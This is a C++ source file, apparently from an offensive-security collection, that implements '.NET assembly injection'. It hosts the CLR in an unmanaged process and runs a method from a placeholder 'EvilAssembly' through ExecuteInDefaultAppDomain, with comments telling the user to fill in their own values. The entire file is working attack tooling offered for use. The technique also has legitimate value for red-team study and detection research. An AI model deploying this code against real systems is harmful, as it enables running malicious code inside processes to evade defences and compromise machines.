/*
* Title: .NET Assembly Injection (Injector)
* Resources:
*	- https://www.ired.team/offensive-security/code-injection-process-injection/injecting-and-executing-.net-assemblies-to-unmanaged-process
*/
#include <Windows.h>
#include <iostream>
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

BOOL DotnetAssemblyInjection() {
	// Replace the following values with your own.
	LPCWSTR lpDotnetVersion = L"v4.0.30319"; // Find the version under C:\Windows\Microsoft.NET\Framework64
	LPCWSTR lpAssemblyPath = L"C:\\EvilAssembly\\bin\\Release\\EvilAssembly.exe";
	LPCWSTR lpAssemblyTypeName = L"EvilAssembly.Program";
	LPCWSTR lpAssemblyMethodName = L"evilMethod";
	LPCWSTR lpAssemblyArgument = L"test";

	ICLRMetaHost* pMetaHost = nullptr;
	ICLRRuntimeInfo* pRuntimeInfo = nullptr;
	ICLRRuntimeHost* pRuntimeHost = nullptr;
	
	CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
	pMetaHost->GetRuntime(lpDotnetVersion, IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
	pRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&pRuntimeHost);
	pRuntimeHost->Start();

	DWORD dwResult;
	HRESULT hRes = pRuntimeHost->ExecuteInDefaultAppDomain(lpAssemblyPath, lpAssemblyTypeName, lpAssemblyMethodName, lpAssemblyArgument, &dwResult);
	if (hRes == S_OK) {
		std::cout << "CLR executed successfully." << std::endl;
	}

	pRuntimeInfo->Release();
	pMetaHost->Release();
	pRuntimeHost->Release();

	return TRUE;
}

int main() {
	DotnetAssemblyInjection();
	return 0;
}